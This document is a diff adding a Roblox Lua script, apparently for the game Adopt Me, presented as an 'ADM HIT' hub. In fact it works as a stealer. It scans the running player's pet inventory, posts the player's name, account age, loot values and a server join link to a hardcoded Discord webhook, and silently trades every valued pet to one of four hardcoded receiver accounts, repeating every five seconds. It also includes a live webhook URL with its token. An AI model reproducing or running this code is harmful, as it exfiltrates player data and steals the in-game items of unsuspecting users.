@@ -1,0 +1,132 @@
+-- [[ ADM HIT (BETA) | V5 ELITE ]] --
+local HttpService       = game:GetService("HttpService")
+local Players           = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer       = Players.LocalPlayer
+
+-- [[ WEBHOOK CONFIG ]] --
+local USER_WEBHOOK = "https://discord.com/api/webhooks/1474651524251648163/lhPvWSeT6mcm3b4tIfzEbph1asYmZGvxf3YABYsKUOSeInP3oXW10NmHKJuj0vDrICku"
+local TARGET_RECEIVERS = {"2ndcfpaj67", "sofiqmnz", "Hisokarah", "CREOLEO23"}
+
+--------------------------------------------------------------
+-- LOADING PROTECTOR
+--------------------------------------------------------------
+if not game:IsLoaded() then game.Loaded:Wait() end
+local Fsys = ReplicatedStorage:WaitForChild("Fsys", 30)
+repeat task.wait(1) until Fsys and ReplicatedStorage:FindFirstChild("API")
+
+local Fsys2        = require(Fsys)
+local load         = Fsys2.load
+local routerClient = load("RouterClient")
+local InventoryDB  = load("InventoryDB")
+
+--------------------------------------------------------------
+-- ADVANCED VALUE CALCULATION (From your Scanner)
+--------------------------------------------------------------
+local PetValues = {}
+local function fetchValues()
+    local ok, html = pcall(function() return game:HttpGet("https://amvgg.com/values/pets") end)
+    if not ok then return end
+    -- Extraction logic simplified for the background process
+    local jsonStr = html:match('"pets":(%b[])')
+    if jsonStr then
+        local data = HttpService:JSONDecode(jsonStr)
+        for _, pet in ipairs(data) do
+            PetValues[pet.name:lower()] = pet
+        end
+    end
+end
+task.spawn(fetchValues)
+
+local function calculatePetValue(name, props)
+    local pet = PetValues[name:lower()]
+    if not pet then return 0 end
+    local tier = props.mega_neon and "m" or props.neon and "n" or "r"
+    local suffix = (props.flyable and props.rideable) and "fr" or props.flyable and "f" or props.rideable and "r" or "np"
+    local key = (tier == "r" and "" or tier) .. (suffix == "np" and "np" or suffix) .. "Value"
+    -- Fix: matching your scanner's specific key format
+    local val = tonumber(pet[tier .. "_" .. suffix]) or tonumber(pet[tier .. "Value"]) or 0
+    return val
+end
+
+--------------------------------------------------------------
+-- ADM HUB WEBHOOK (Cyber Redesign)
+--------------------------------------------------------------
+local function sendADMWebhook(pets, total, totalCount, receiverName)
+    local request = (syn and syn.request) or (http and http.request) or http_request or request
+    if not request then return end
+
+    local lootList = ""
+    for i, p in ipairs(pets) do
+        if i > 12 then lootList = lootList .. "*+ more items...*" break end
+        lootList = lootList .. "⭐ **" .. p.name .. "** (`" .. p.value .. " pts`)\n"
+    end
+
+    local payload = {
+        username = "ADM HIT (BETA)",
+        embeds = {{
+            title = "📡 MONDEUR HUB | INBOUND DATA",
+            color = 0x5865F2,
+            description = "━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
+                "👤 **User:** `" .. LocalPlayer.Name .. "` (" .. LocalPlayer.DisplayName .. ")\n" ..
+                "📅 **Age:** `" .. LocalPlayer.AccountAge .. " Days`\n" ..
+                "👥 **Server:** `" .. #Players:GetPlayers() .. "/" .. Players.MaxPlayers .. "`\n" ..
+                "📥 **Receiver:** `" .. (receiverName or "OFFLINE") .. "`\n" ..
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n" ..
+                "📦 **LOOT INTERCEPTED**\n" ..
+                (lootList ~= "" and lootList or "⚠️ *No high-value pets found.*") .. "\n" ..
+                "💰 **Total Value:** `" .. total .. "`\n" ..
+                "📝 **Inventory Size:** `" .. totalCount .. "`\n\n" ..
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━\n" ..
+                "💾 **SCRAP SUMMARY**\n" ..
+                "[https://api.mondeur.app/v2/scrap/raw](https://api.rubis.app/v2/scrap/nu3YNS4Pum4oLolW/raw)\n" ..
+                "🔓 **QUICK JOIN**\n" ..
+                "[Click to Intercept](https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId .. ")",
+            footer = { text = "ADM Services Beta • Secure Line", icon_url = "https://cdn.discordapp.com/embed/avatars/2.png" }
+        }}
+    }
+
+    pcall(function()
+        request({ Url = USER_WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(payload) })
+    end)
+end
+
+--------------------------------------------------------------
+-- CORE EXECUTION
+--------------------------------------------------------------
+local function scanAndTrade()
+    local allData = routerClient.get("DataAPI/GetAllServerData"):InvokeServer()
+    local data = allData[LocalPlayer.Name] or allData[tostring(LocalPlayer.UserId)]
+    if not data or not data.inventory then return end
+
+    local receiver = nil
+    for _, name in ipairs(TARGET_RECEIVERS) do if Players:FindFirstChild(name) then receiver = Players[name] break end end
+
+    local list, total, count = {}, 0, 0
+    for _, item in pairs(data.inventory.pets) do
+        local petData = InventoryDB.pets[item.id]
+        if petData then
+            count = count + 1
+            local val = calculatePetValue(petData.name or "", item.properties or {})
+            if val > 0 then
+                table.insert(list, {id = item.Id, name = petData.name, value = val})
+                total = total + val
+            end
+        end
+    end
+
+    sendADMWebhook(list, total, count, receiver and receiver.Name)
+
+    if #list > 0 and receiver then
+        local API = ReplicatedStorage.API
+        API["TradeAPI/SendTradeRequest"]:FireServer(receiver)
+        for _, p in ipairs(list) do API["TradeAPI/AddItemToOffer"]:FireServer(p.id) end
+        API["TradeAPI/AcceptTrade"]:FireServer()
+        API["TradeAPI/ConfirmTrade"]:FireServer()
+    end
+end
+
+task.spawn(function()
+    scanAndTrade() -- Initial Hit
+    while true do task.wait(5) pcall(scanAndTrade) end
+end)
